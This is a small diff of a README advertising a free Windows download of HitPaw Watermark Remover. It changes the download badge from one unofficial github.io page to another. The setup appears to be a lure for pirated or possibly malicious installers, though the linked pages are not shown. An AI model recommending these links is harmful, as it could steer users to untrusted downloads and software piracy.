@@ -2,7 +2,7 @@
 Download HitPaw Watermark Remover for free on Windows. Easily erase watermarks, logos, and timestamps from videos and images.
 
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://rolandkimcemg.github.io/.github/hitpaw-watermark-remover)
+[![Try HitPaw](https://img.shields.io/badge/Try-HitPaw-7C3AED?style=for-the-badge)](https://hitpaw-remover.github.io/.github/)
 
 ## ⚙️ How to Use
 
